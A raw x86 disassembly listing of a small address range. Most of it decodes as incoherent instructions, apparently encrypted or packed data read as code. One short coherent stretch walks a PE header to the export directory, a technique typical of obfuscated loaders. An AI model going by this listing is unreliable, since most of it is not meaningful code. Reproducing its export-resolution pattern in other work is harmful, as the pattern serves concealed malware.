  4084b4:	jle    0x40846c
  4084b6:	mov    edx,0x304eb585
  4084bb:	stos   BYTE PTR es:[edi],al
  4084bc:	push   ss
  4084bd:	mov    esi,0xcdf9510d
  4084c2:	cmc    
  4084c3:	(bad)  
  4084c4:	nop
  4084c5:	scas   eax,DWORD PTR es:[edi]
  4084c6:	das    
  4084c7:	call   0x32fe:0xf159a36c
  4084ce:	stos   DWORD PTR es:[edi],eax
  4084cf:	repz int 0x2b
  4084d2:	gs mov eax,0x3b00b7ff
  4084d9:	loop   0x40848f
  4084db:	ret    0x87c
  4084de:	lds    ebp,FWORD PTR [ecx-0x21]
  4084e1:	sbb    BYTE PTR [ecx-0x5c9296af],bl
  4084e7:	js     0x4084e9
  4084e9:	xchg   DWORD PTR [ebx+edi*8],edx
  4084ec:	outs   dx,DWORD PTR ds:[esi]
  4084ed:	in     al,dx
  4084ee:	ror    BYTE PTR [edx],cl
  4084f0:	loop   0x40853f
  4084f2:	lea    esp,[ebx]
  4084f4:	gs push ebp
  4084f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084f7:	mov    ebp,es
  4084f9:	push   0xffffffd2
  4084fb:	cld    
  4084fc:	add    eax,0x663ec84a
  408501:	fdecstp 
  408503:	mov    bl,0x98
  408505:	and    bh,BYTE PTR [esi+ebp*1+0x5710f751]
  40850c:	and    DWORD PTR [eax+0x58ed73],0x2cc8989a
  408516:	inc    ebx
  408517:	adc    ecx,DWORD PTR [ebp-0x7]
  40851a:	pusha  
  40851b:	sbb    al,0xf3
  40851d:	sbb    bl,BYTE PTR [eax+0x32]
  408520:	pop    eax
  408521:	cwde   
  408522:	pop    ebp
  408523:	into   
  408524:	add    BYTE PTR [esi-0x56d11d03],dl
  40852a:	jno    0x408527
  40852c:	xor    BYTE PTR [ebx],bl
  40852e:	jnp    0x40853e
  408530:	retf   0x607f
  408533:	lahf   
  408534:	dec    edx
  408535:	push   0x9d2516ee
  40853a:	dec    ebx
  40853b:	and    al,0x3
  40853d:	xchg   BYTE PTR [esi-0x59],ah
  408540:	icebp  
  408541:	sbb    BYTE PTR [ebp+0x3b],al
  408544:	adc    eax,0x87484ad0
  408549:	cmp    eax,0xda01b495
  40854e:	aas    
  40854f:	xor    BYTE PTR [edi],cl
  408551:	out    dx,eax
  408552:	imul   ch
  408554:	inc    eax
  408555:	test   DWORD PTR [esi-0x67],edx
  408558:	lea    ebx,[esi-0x59]
  40855b:	sbb    ebx,DWORD PTR [ecx+ebx*2-0x3a350418]
  408562:	push   es
  408563:	xchg   ebp,eax
  408564:	out    0xed,eax
  408566:	dec    BYTE PTR ds:0x4098a9cb
  40856c:	aas    
  40856d:	add    DWORD PTR [edx+eax*2],eax
  408570:	cli    
  408571:	fisub  DWORD PTR [ebx]
  408573:	dec    eax
  408574:	inc    esp
  408575:	xchg   edx,eax
  408576:	mov    dl,0x11
  408578:	adc    al,0x79
  40857a:	mov    al,BYTE PTR [edi+edi*2]
  40857d:	outs   dx,DWORD PTR ds:[esi]
  40857e:	es stos BYTE PTR es:[edi],al
  408580:	push   esi
  408581:	mov    fs,WORD PTR [ecx]
  408583:	xchg   esi,eax
  408584:	or     esi,eax
  408586:	int    0xa5
  408588:	mov    bl,0x81
  40858a:	jecxz  0x40858e
  40858c:	jnp    0x4085ed
  40858e:	loopne 0x4085c0
  408590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408591:	ins    BYTE PTR es:[edi],dx
  408592:	inc    ebx
  408593:	pop    edx
  408594:	cdq    
  408595:	push   esp
  408596:	jle    0x4085f9
  408598:	inc    esi
  408599:	bnd jo 0x4085cf
  40859c:	xchg   edi,eax
  40859d:	xchg   ebx,eax
  40859e:	xor    al,BYTE PTR [eax]
  4085a0:	adc    bl,BYTE PTR [eax-0x69f3022f]
  4085a6:	adc    dl,BYTE PTR [ecx+ecx*8]
  4085a9:	or     edi,DWORD PTR [esi-0x44fd83b0]
  4085af:	mov    ah,0x8f
  4085b1:	pop    ebx
  4085b2:	jbe    0x408589
  4085b4:	xor    eax,0x248712d2
  4085b9:	cld    
  4085ba:	inc    esp
  4085bb:	mov    eax,0x521a5c13
  4085c0:	adc    ch,BYTE PTR [ecx]
  4085c2:	test   DWORD PTR [ebp-0x34d976bc],ebp
  4085c8:	cmp    al,0x3d
  4085ca:	lods   al,BYTE PTR ds:[esi]
  4085cb:	ins    BYTE PTR es:[edi],dx
  4085cc:	or     bl,dh
  4085ce:	mov    gs,WORD PTR [ebx+0x5f]
  4085d1:	out    0x90,al
  4085d3:	xchg   esi,eax
  4085d4:	test   DWORD PTR [ecx-0x16fb8d16],eax
  4085da:	lgs    edx,FWORD PTR [esi+0x7baff17a]
  4085e1:	(bad)  
  4085e2:	mov    eax,DWORD PTR [edx+0x3e65b421]
  4085e8:	pop    edx
  4085e9:	xlat   BYTE PTR ds:[ebx]
  4085ea:	xor    eax,0x8fd5be1d
  4085ef:	pop    ebp
  4085f0:	jnp    0x408633
  4085f2:	out    dx,eax
  4085f3:	xchg   DWORD PTR [eax+ecx*2],ecx
  4085f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085f7:	shr    BYTE PTR [edi+0x13],cl
  4085fa:	xor    cl,cl
  4085fc:	add    dl,ah
  4085fe:	push   edx
  4085ff:	xor    ch,0x4a
  408602:	dec    esp
  408603:	shr    DWORD PTR [ecx-0x79],0x37
  408607:	dec    ebp
  408608:	sub    al,0xa8
  40860a:	inc    ecx
  40860b:	fwait
  40860c:	icebp  
  40860d:	call   0x9e44:0x34d14e4d
  408614:	leave  
  408615:	add    ah,BYTE PTR [edx]
  408617:	push   edi
  408618:	jecxz  0x4085c6
  40861a:	inc    esi
  40861b:	fs push ss
  40861d:	rep outs dx,DWORD PTR ds:[esi]
  40861f:	push   esi
  408620:	sbb    edx,DWORD PTR [ebx+0x257848d0]
  408626:	imul   eax,edx,0x83981711
  40862c:	and    eax,DWORD PTR [ebx-0x4afd2d33]
  408632:	shr    BYTE PTR [ecx],0xed
  408635:	cmp    al,0x13
  408637:	xchg   edx,eax
  408638:	sar    BYTE PTR [ecx+eiz*8],1
  40863b:	push   0x6304d087
  408640:	aam    0x62
  408642:	scas   al,BYTE PTR es:[edi]
  408643:	fimul  DWORD PTR [edi]
  408645:	scas   al,BYTE PTR es:[edi]
  408646:	in     eax,0x53
  408648:	add    dl,BYTE PTR [esi+0x1b]
  40864b:	cmp    DWORD PTR [ecx-0x68],eax
  40864e:	inc    esi
  40864f:	sar    DWORD PTR [eax+0x24db2c8c],0xf
  408656:	test   DWORD PTR [eax+eax*1],ecx
  408659:	add    BYTE PTR [eax],al
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xaa53fd14
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    al,dl
  40869e:	int3   
  40869f:	or     DWORD PTR [edi],esp
  4086a1:	into   
  4086a2:	jbe    0x4086d1
  4086a4:	mov    al,0xaf
  4086a6:	and    DWORD PTR [esi],0x40
  4086a9:	repz inc esi
  4086ab:	or     eax,0x5b05fe5e
  4086b0:	imul   edi,DWORD PTR [esi+esi*1],0xfc32a88d
  4086b7:	xor    eax,DWORD PTR [edi+0x1b77f12d]
  4086bd:	ror    BYTE PTR [ecx],cl
  4086bf:	mov    edi,0x46e23bac
  4086c4:	xchg   ebp,eax
  4086c5:	sub    BYTE PTR [eax+0x18f3e009],bl
  4086cb:	test   ch,cl
  4086cd:	and    dh,dl
  4086cf:	idiv   DWORD PTR [ebx-0x75830d7e]
  4086d5:	jb     0x40870b
  4086d7:	xor    al,0x9c
  4086d9:	adc    cl,bl
  4086db:	inc    ebp
  4086dc:	adc    BYTE PTR [eax+edi*8+0x50],bh
  4086e0:	dec    eax
  4086e1:	mov    esi,0x81704540
  4086e6:	pop    eax
  4086e7:	jno    0x4086a1
  4086e9:	imul   ebp,DWORD PTR [esi-0x34b43d35],0x906efd51
  4086f3:	mov    dh,0x41
  4086f5:	dec    ecx
  4086f6:	push   esi
  4086f7:	push   ecx
  4086f8:	mov    dl,0x9e
  4086fa:	lods   al,BYTE PTR ds:[esi]
  4086fb:	idiv   esp
  4086fd:	aam    0x9c
  4086ff:	xchg   esi,eax
  408700:	das    
  408701:	ret    0xf4b1
  408704:	inc    esp
  408705:	pop    ebp
  408706:	cmc    
  408707:	mov    eax,ss
  408709:	add    eax,0xe9b0d544
  40870e:	cdq    
  40870f:	mov    ds,WORD PTR [ecx-0x32f314df]
  408715:	ins    BYTE PTR es:[edi],dx
  408716:	mov    ebp,0x1db2473
  40871b:	mov    ds:0xf9463bca,al
  408720:	mov    al,BYTE PTR [ebp+0xc]
  408723:	sub    bh,dh
  408725:	icebp  
  408726:	stos   DWORD PTR es:[edi],eax
  408727:	dec    esi
  408728:	ss jbe 0x408791
  40872b:	aas    
  40872c:	xchg   edx,eax
  40872d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40872e:	(bad)  
  40872f:	rcr    BYTE PTR [esi+0x5c],1
  408732:	popa   
  408733:	cmc    
  408734:	bound  esp,QWORD PTR [esi]
  408736:	xchg   eax,edx
  408738:	inc    ecx
  408739:	xchg   cl,al
  40873b:	das    
  40873c:	push   esp
  40873d:	sub    bl,BYTE PTR [eax+esi*8]
  408740:	imul   esi,DWORD PTR [esi+0x6c1005d6],0xa2a6d650
  40874a:	xchg   ebx,eax
  40874b:	lea    ebp,[eax]
  40874d:	ds in  al,dx
  40874f:	aaa    
  408750:	sub    edi,DWORD PTR [edi-0x4a]
  408753:	daa    
  408754:	xchg   ebp,eax
  408755:	push   0xe90cbc6f
  40875a:	loope  0x408798
  40875c:	fsub   DWORD PTR [ebp+0x76feade7]
  408762:	pusha  
  408763:	adc    edx,esi
  408765:	add    DWORD PTR [ebx],ebx
  408767:	jo     0x408724
  408769:	loop   0x4086f2
  40876b:	adc    al,0xa3
  40876d:	ja     0x40875e
  40876f:	mov    bh,0xc6
  408771:	lds    edx,FWORD PTR [ecx+0x37]
  408774:	pushf  
  408775:	jp     0x408740
  408777:	cmp    eax,0x3d8bf3ed
  40877c:	into   
  40877d:	pop    ds
  40877e:	pop    ds
  40877f:	and    eax,0x86547f90
  408784:	pop    ecx
  408785:	aas    
  408786:	push   edi
  408787:	sub    esp,DWORD PTR [ebp-0x615620f7]
  40878d:	(bad)  
  40878e:	sbb    ebp,ecx
  408790:	in     al,0x2
  408792:	adc    ebp,DWORD PTR [edx+0x53246c28]
  408798:	addr16 repnz (bad) 
  40879b:	jno    0x4087ad
  40879d:	xlat   BYTE PTR ds:[ebx]
  40879e:	xchg   edi,eax
  40879f:	out    0xae,al
  4087a1:	lock mov dl,0x5b
  4087a4:	mov    ebx,0xe6390730
  4087a9:	jmp    0x408819
  4087ab:	sub    DWORD PTR [edi-0x59],0xffffffc6
  4087af:	jmp    0x15c:0x671a704e
  4087b6:	jmp    0xb88e3904
  4087bb:	mov    edx,0xe7f98441
  4087c0:	mov    edi,0x95f81598
  4087c5:	sbb    cl,cl
  4087c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087c8:	jle    0x40882c
  4087ca:	mov    ecx,0x53beca8
  4087cf:	xor    DWORD PTR [esp+ebp*4],0xc8715dd0
  4087d6:	pusha  
  4087d7:	xor    dl,0xae
  4087da:	push   ss
  4087db:	xchg   ebp,eax
  4087dc:	and    al,0xb4
  4087de:	cmp    ebp,DWORD PTR [eax-0x49]
  4087e1:	xchg   ebx,eax
  4087e2:	out    dx,eax
  4087e3:	mov    DWORD PTR [edx+0x77],ebp
  4087e6:	add    al,0x41
  4087e8:	push   ebp
  4087e9:	xchg   BYTE PTR [ebp-0x80],ah
  4087ec:	gs je  0x408862
  4087ef:	retf   0x18ae
  4087f2:	mov    esp,0xe999934d
  4087f7:	and    DWORD PTR [esi],esp
  4087f9:	jbe    0x408864
  4087fb:	mov    edi,0x4292fca7
  408800:	and    eax,0x1966cdb5
  408805:	xor    al,0xba
  408807:	stc    
  408808:	(bad)  
  40880a:	cwde   
  40880b:	fwait
  40880c:	pop    es
  40880d:	jb     0x4087a5
  40880f:	jmp    0x2e81:0x95dffd47
  408816:	xlat   BYTE PTR ds:[ebx]
  408817:	and    DWORD PTR ds:0xe42186b7,0xde9684f8
  408821:	in     eax,0x81
  408823:	xor    esp,ebx
  408825:	(bad)  
  408827:	out    dx,al
  408828:	pop    ecx
  408829:	push   0x48abfa49
  40882e:	rcl    DWORD PTR fs:[ecx-0x463e35de],1
  408835:	fsubr  QWORD PTR [ebx+0x69]
  408838:	stos   BYTE PTR es:[edi],al
  408839:	jmp    0x8015f14c
  40883e:	dec    edx
  40883f:	nop
  408840:	adc    BYTE PTR [ecx-0x2f],dh
  408843:	int3   
  408844:	mov    al,ds:0x46d0f28e
  408849:	in     al,dx
  40884a:	retf   
  40884b:	cmp    ebp,DWORD PTR [ebx]
  40884d:	push   ds
  40884e:	cmp    ch,BYTE PTR ds:0xc00e02a6
  408854:	xor    bl,bh
  408856:	and    DWORD PTR [esi],edx
  408858:	ret    0x5422
  40885b:	sbb    eax,0x74564b4f
  408860:	daa    
  408861:	cwde   
  408862:	adc    BYTE PTR [ecx-0x50],0xed
  408866:	add    eax,0xfa9877f8
  40886b:	push   ds
  40886c:	into   
  40886d:	pop    edi
  40886e:	loope  0x4088d3
  408870:	cdq    
  408871:	sub    ch,BYTE PTR [edi]
  408873:	(bad)  
  408874:	cdq    
  408875:	add    ch,bh
  408877:	nop
  408878:	mov    ?,WORD PTR [ecx+0x23]
  40887b:	xor    DWORD PTR [edi-0x10c9a7cd],esp
  408881:	jo     0x4088da
  408883:	or     esp,DWORD PTR [ebp+0xf]
  408886:	test   BYTE PTR [ecx+0x2692966b],dh
  40888c:	dec    edx
  40888d:	and    BYTE PTR [esi-0xbd50384],cl
  408893:	inc    edx
  408894:	adc    eax,0xf4033fb9
  408899:	cs mov dl,0xde
  40889c:	sbb    al,ah
  40889e:	adc    DWORD PTR [ebp-0x68],ebx
  4088a1:	popa   
  4088a2:	cwde   
  4088a3:	loop   0x4088ee
  4088a5:	call   0x2bfd3056
  4088aa:	mov    DWORD PTR [edx+0x35],esp
  4088ad:	jg     0x4088ca
  4088af:	add    al,BYTE PTR [esp+ebx*8-0x66]
  4088b3:	mov    bh,BYTE PTR ds:0x63492731
  4088b9:	push   0xf0fcbed1
  4088be:	les    edx,FWORD PTR [ebx+0x28]
  4088c1:	and    DWORD PTR [edx-0x35],edx
  4088c4:	push   esi
  4088c5:	dec    eax
  4088c6:	xchg   ebx,eax
  4088c8:	sbb    al,0xf
  4088ca:	rcl    ebx,1
  4088cc:	adc    eax,DWORD PTR [edi-0x10abd8b0]
  4088d2:	shr    BYTE PTR [edx+0x648b9b12],0x47
  4088d9:	pop    ds
  4088da:	sbb    esp,DWORD PTR [esi+eax*2-0x53c3cc6f]
  4088e1:	retf   0x2163
  4088e4:	inc    edx
  4088e5:	inc    ebp
  4088e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e7:	ins    BYTE PTR es:[edi],dx
  4088e8:	loop   0x40891b
  4088ea:	ss mov edx,0x1379ea4f
  4088f0:	in     eax,0x5e
  4088f2:	pop    ds
  4088f3:	retf   
  4088f4:	xchg   edi,eax
  4088f5:	sub    DWORD PTR [ebp+ecx*1-0xf791946],esi
  4088fc:	add    cl,bh
  4088fe:	add    dl,BYTE PTR [ebp-0x77973fc6]
  408904:	mov    ebx,0x8160dfe9
  408909:	add    BYTE PTR [ebp+0x51e96fc1],ch
  40890f:	cdq    
  408910:	sbb    DWORD PTR [edx],0xc7b45015
  408916:	ret    
  408917:	mov    BYTE PTR [ebp+0x3c],ch
  40891a:	sbb    esi,0x7a
  40891d:	mov    eax,0x81b7681
  408922:	sahf   
  408923:	add    ecx,DWORD PTR [ecx]
  408925:	mov    edx,cs
  408927:	cdq    
  408928:	adc    esi,eax
  40892a:	xor    al,0xb8
  40892c:	adc    bh,ah
  40892e:	(bad)  
  40892f:	lods   al,BYTE PTR fs:[esi]
  408931:	je     0x408973
  408933:	dec    ebx
  408934:	dec    ebx
  408935:	sbb    al,0x87
  408937:	repz sbb al,0x5
  40893a:	bnd jb 0x40890e
  40893d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40893e:	in     al,0x60
  408940:	add    al,0x79
  408942:	ret    
  408943:	es mov ch,0xf7
  408946:	repnz mov dl,0xdb
  408949:	mov    bl,0x6e
  40894b:	fwait
  40894c:	dec    ecx
  40894d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40894e:	ins    DWORD PTR es:[edi],dx
  40894f:	fild   WORD PTR [ebp-0x45]
  408952:	test   DWORD PTR [eax+0x351732b0],edi
  408958:	loope  0x4088f4
  40895a:	pusha  
  40895b:	pop    ebp
  40895c:	pop    ds
  40895d:	sbb    BYTE PTR [ecx],cl
  40895f:	and    al,0x81
  408961:	push   0x5ea58763
  408966:	jecxz  0x408970
  408968:	mov    esp,DWORD PTR [ebp-0x5be565b2]
  40896e:	repz add eax,0x26678c00
  408974:	and    DWORD PTR [edx+0x6f],0x4f351f87
  40897b:	aaa    
  40897c:	cwde   
  40897d:	lods   eax,DWORD PTR ds:[esi]
  40897f:	retf   0x6e9e
  408982:	push   0xc9a99df0
  408987:	push   ebp
  408988:	push   edi
  408989:	jo     0x40893b
  40898b:	ret    
  40898c:	jb     0x4089b9
  40898e:	pop    eax
  40898f:	xor    esi,DWORD PTR [ecx-0x68]
  408992:	mov    esp,0x7bb6be3
  408997:	(bad)  
  408998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408999:	and    edi,ecx
  40899b:	bound  edi,QWORD PTR [ebx+0x17150ee2]
  4089a1:	ja     0x4089a1
  4089a3:	push   esi
  4089a4:	lahf   
  4089a5:	xchg   esi,eax
  4089a6:	sub    BYTE PTR [ebp+0x35f0cf43],bl
  4089ac:	inc    ebx
  4089ad:	inc    esi
  4089ae:	push   0xffffffaf
  4089b0:	or     DWORD PTR [ebx],0xffffff8f
  4089b3:	pop    esi
  4089b4:	mov    ds:0x3316eb85,eax
  4089b9:	add    eax,0x9b38b73e
  4089be:	mov    al,0xc7
  4089c0:	aaa    
  4089c1:	push   es
  4089c2:	std    
  4089c3:	lods   al,BYTE PTR ds:[esi]
  4089c4:	jb     0x4089db
  4089c6:	(bad)  
  4089c7:	adc    ebp,DWORD PTR [esi+0x23]
  4089ca:	popa   
  4089cb:	sti    
  4089cc:	aaa    
  4089cd:	lock mov edi,DWORD PTR [edx-0x648c588c]
  4089d4:	int    0x15
  4089d6:	and    al,0x3d
  4089d8:	mov    ebp,0x46899561
  4089dd:	and    eax,0x604a8b4f
  4089e2:	fst    QWORD PTR [eax]
  4089e4:	jmp    0x4089bb
  4089e6:	push   ebp
  4089e7:	js     0x40896d
  4089e9:	test   BYTE PTR [ebx+esi*4],0x4d
  4089ed:	pusha  
  4089ee:	iretw  
  4089f0:	pop    ebp
  4089f1:	nop
  4089f2:	inc    esp
  4089f3:	sbb    al,0x21
  4089f5:	lea    edi,[ebp-0x1c]
  4089f8:	dec    ebp
  4089f9:	rol    BYTE PTR [eax-0x1],cl
  4089fc:	inc    ecx
  4089fd:	sbb    DWORD PTR [ebp+0xcdd2ce0],edx
  408a03:	xchg   DWORD PTR [ebx],esp
  408a05:	sbb    esi,DWORD PTR [edi-0xc85ac56]
  408a0b:	dec    esp
  408a0c:	xchg   DWORD PTR [edi-0x2a84f400],ecx
  408a12:	lock rol DWORD PTR [edx+eiz*4-0x16f16109],0xc7
  408a1b:	inc    esi
  408a1c:	jbe    0x4089c0
  408a1e:	in     al,dx
  408a1f:	adc    al,0xf9
  408a21:	cmp    dl,BYTE PTR [esi-0x73]
  408a24:	int3   
  408a25:	push   edi
  408a26:	mov    esp,0xe5d6f9ea
  408a2b:	test   ah,ah
  408a2d:	mov    edi,0x792c6ff6
  408a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a33:	adc    DWORD PTR [eax-0x44],ebp
  408a36:	and    BYTE PTR [edi+0x38],al
  408a39:	ja     0x408aa4
  408a3b:	call   0xe289de7
  408a40:	cs out 0xd1,eax
  408a43:	rcr    BYTE PTR [edx],0xc0
  408a46:	sub    al,0x30
  408a48:	fimul  DWORD PTR [ebx-0x67ecb327]
  408a4e:	nop
  408a4f:	jl     0x408a22
  408a51:	xchg   esi,eax
  408a52:	(bad)  
  408a53:	ficomp DWORD PTR [esi+0x72]
  408a56:	bound  edi,QWORD PTR [eax-0x5f]
  408a59:	fcom   QWORD PTR [eax+esi*8+0x1d]
  408a5d:	sbb    al,0x8b
  408a5f:	push   es
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	aas    
  408a75:	inc    eax
  408a76:	scas   eax,DWORD PTR es:[edi]
  408a77:	mov    al,0xb5
  408a79:	push   edi
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    cl,ch
  408a81:	mov    ebx,0x3003176
  408a86:	dec    esi
  408a87:	ins    DWORD PTR es:[edi],dx
  408a88:	sbb    al,0xe6
  408a8a:	pusha  
  408a8b:	js     0x408a71
  408a8d:	sbb    eax,0x853541e8
  408a92:	cwde   
  408a93:	nop
  408a94:	dec    edx
  408a95:	push   cs
  408a96:	sbb    al,0xc8
  408a98:	pusha  
  408a99:	aam    0x4d
  408a9b:	repnz pop es
  408a9d:	mov    dh,BYTE PTR [edi]
  408a9f:	iret   
  408aa0:	scas   eax,DWORD PTR es:[edi]
  408aa1:	ds gs pop ecx
  408aa4:	cmp    eax,0xdae1d8f
  408aa9:	mov    ch,BYTE PTR [ecx]
  408aab:	test   eax,0x4e95f2cb
  408ab0:	fisttp QWORD PTR [edi-0x1c2a586d]
  408ab6:	ja     0x408a8a
  408ab8:	aas    
  408ab9:	jno    0x408ad4
  408abb:	fist   DWORD PTR fs:[eax+0x63cfa50e]
  408ac2:	hlt    
  408ac3:	inc    ebp
  408ac4:	sbb    eax,0x910cf260
  408ac9:	xchg   ebp,eax
  408aca:	sub    BYTE PTR [ecx+0x6b],bh
  408acd:	jmp    0x408aad
  408acf:	(bad)  
  408ad0:	xchg   esp,eax
  408ad1:	push   edi
  408ad2:	dec    edx
  408ad3:	add    BYTE PTR [eax+eax*4],0xd3
  408ad7:	sub    cl,BYTE PTR [eax]
  408ad9:	cdq    
  408ada:	sbb    DWORD PTR [eax-0x71],esi
  408add:	leave  
  408ade:	push   0x56b10d07
  408ae3:	je     0x408b5c
  408ae5:	enter  0x70cc,0x68
  408ae9:	dec    edi
  408aea:	sahf   
  408aeb:	mov    ds:0xb17a90a3,eax
  408af0:	inc    eax
  408af1:	stos   BYTE PTR es:[edi],al
  408af2:	mov    ebx,0x2a371448
  408af7:	fisttp DWORD PTR [edi+0xcab2efd]
  408afd:	mov    ds:0x2066613d,eax
  408b02:	and    DWORD PTR [ebp-0x71],ebx
  408b05:	loop   0x408b07
  408b07:	nop
  408b08:	xor    eax,0xa93009c1
  408b0d:	in     eax,dx
  408b0e:	jno    0x408b85
  408b10:	hlt    
  408b11:	cld    
  408b12:	ret    
  408b13:	loopne 0x408b36
  408b15:	xchg   ecx,eax
  408b16:	pop    ds
  408b17:	inc    eax
  408b18:	push   ss
  408b19:	scas   eax,DWORD PTR es:[edi]
  408b1a:	sar    DWORD PTR [eax+0x2010331],1
  408b20:	out    dx,al
  408b21:	in     al,0x99
  408b23:	and    ebx,edi
  408b25:	and    ebx,DWORD PTR [eax+eax*1]
  408b28:	sbb    DWORD PTR [ecx-0xe98717c],edi
  408b2e:	test   eax,0x300312e
  408b33:	jmp    0x408acf
  408b35:	jmp    0x7b78122
  408b3a:	icebp  
  408b3b:	retw   
  408b3d:	hlt    
  408b3e:	xchg   esi,eax
  408b3f:	jns    0x408b36
  408b41:	add    ecx,DWORD PTR [ecx+0x5189b3dc]
  408b47:	push   ebp
  408b48:	mov    ds:0x79c5661e,eax
  408b4d:	pusha  
  408b4e:	adc    eax,DWORD PTR [esi+0x41bd00c2]
  408b54:	lahf   
  408b55:	inc    ebp
  408b56:	jae    0x408b8a
  408b58:	mov    eax,ds:0x1f82fa62
  408b5d:	and    DWORD PTR [edx],edx
  408b5f:	cs xchg edi,eax
  408b61:	in     al,dx
  408b62:	mov    al,0xc9
  408b64:	dec    edi
  408b65:	pop    esp
  408b66:	push   ss
  408b67:	idiv   DWORD PTR [esi+ecx*2-0x73225394]
  408b6e:	jp     0x408bd5
  408b70:	mov    eax,ds:0xfdde73e0
  408b75:	enter  0xb317,0xe0
  408b79:	ins    BYTE PTR es:[edi],dx
  408b7a:	repz push cs
  408b7c:	pusha  
  408b7d:	sbb    DWORD PTR ds:0x98809691,ebp
  408b83:	sub    BYTE PTR [esi+0x11ae47f8],bl
  408b89:	xchg   edx,eax
  408b8a:	jo     0x408b7d
  408b8c:	xor    BYTE PTR [edi+0x8f0e8be],dh
  408b92:	add    eax,0xa1abf99d
  408b97:	pop    ecx
  408b98:	mov    WORD PTR [ecx-0x773bfaaf],?
  408b9e:	pop    edi
  408b9f:	inc    si
  408ba1:	xlat   BYTE PTR ds:[ebx]
  408ba2:	mov    cl,BYTE PTR [edx+edi*2-0x6b]
  408ba6:	pushf  
  408ba7:	xchg   ebp,eax
  408ba8:	out    dx,al
  408ba9:	xchg   ebx,eax
  408baa:	fiadd  DWORD PTR [ebp+esi*4-0x6093e7f6]
  408bb1:	sti    
  408bb2:	test   eax,0xe4f2ff5e
  408bb7:	in     eax,0x6
  408bb9:	out    0x83,eax
  408bbb:	shr    ah,0x9
  408bbe:	(bad)  
  408bbf:	sub    eax,0xcecbb1f2
  408bc4:	jge    0x408b56
  408bc6:	or     BYTE PTR [edi+0xd505c81],0xe6
  408bcd:	adc    dl,dh
  408bcf:	mov    DWORD PTR [edi],0xb86b69fe
  408bd5:	scas   al,BYTE PTR es:[edi]
  408bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bd7:	lds    ebp,FWORD PTR [eax-0x11]
  408bda:	pop    esi
  408bdb:	cmp    eax,0x71483185
  408be0:	mov    bh,0x83
  408be2:	mov    esi,esi
  408be4:	aaa    
  408be5:	dec    edi
  408be6:	call   0x4345:0x5e36a66e
  408bed:	stc    
  408bee:	jge    0x408c2f
  408bf0:	aas    
  408bf1:	repz test DWORD PTR [edi+ebx*1+0x5a],esi
  408bf6:	lods   al,BYTE PTR ds:[esi]
  408bf7:	mov    bl,0x96
  408bf9:	imul   eax,DWORD PTR [esp+eiz*4],0xa6447acd
  408c00:	lock imul ebp,DWORD PTR [ecx-0x44],0xffffffb3
  408c05:	xor    BYTE PTR [ecx-0x7ef02476],dl
  408c0b:	ins    BYTE PTR es:[edi],dx
  408c0c:	xor    eax,0x18a2a0f8
  408c11:	xor    DWORD PTR [edi-0x9f858c5],0xdfa55e40
  408c1b:	and    bh,ah
  408c1d:	js     0x408c7b
  408c1f:	jge    0x408c1b
  408c21:	push   ds
  408c22:	jae    0x408bf8
  408c24:	cmp    cl,dl
  408c26:	jb     0x408c32
  408c28:	fldcw  WORD PTR cs:[edx+edx*2]
  408c2c:	cmp    dh,BYTE PTR [esi+0x68c8dec7]
  408c32:	lock add al,0xc4
  408c35:	jg     0x408c2f
  408c37:	nop
  408c38:	sbb    cl,BYTE PTR [ebx]
  408c3a:	ret    0x3683
  408c3d:	icebp  
  408c3e:	add    BYTE PTR ds:0x31976cd5,bh
  408c44:	lock xor al,0xce
  408c47:	sahf   
  408c48:	(bad)  
  408c49:	fimul  WORD PTR [esi]
  408c4b:	nop
  408c4c:	xor    BYTE PTR [ebp+eiz*1-0x3e783471],al
  408c53:	xor    bl,BYTE PTR [esi]
  408c55:	jo     0x408cc3
  408c57:	or     bl,bl
  408c59:	pop    ss
  408c5a:	xor    ecx,DWORD PTR [edi+0xbb0e327]
  408c60:	adc    BYTE PTR [eax+0x26834565],ah
  408c66:	cld    
  408c67:	sub    edi,eax
  408c69:	sbb    ch,BYTE PTR [eax]
  408c6b:	jle    0x408c13
  408c6d:	fcom   QWORD PTR [eax-0x52a9c13a]
  408c73:	add    al,0xef
  408c75:	sbb    ebp,edi
  408c77:	pop    es
  408c78:	inc    ecx
  408c79:	dec    esp
  408c7a:	daa    
  408c7b:	mov    al,0x67
  408c7d:	(bad)  
  408c7e:	pop    ebp
  408c7f:	sub    bh,BYTE PTR [ebp+edx*1+0x55094457]
  408c86:	mov    eax,DWORD PTR [ecx-0x39]
  408c89:	mov    esi,0x47d8eeba
  408c8e:	dec    edi
  408c8f:	(bad)  
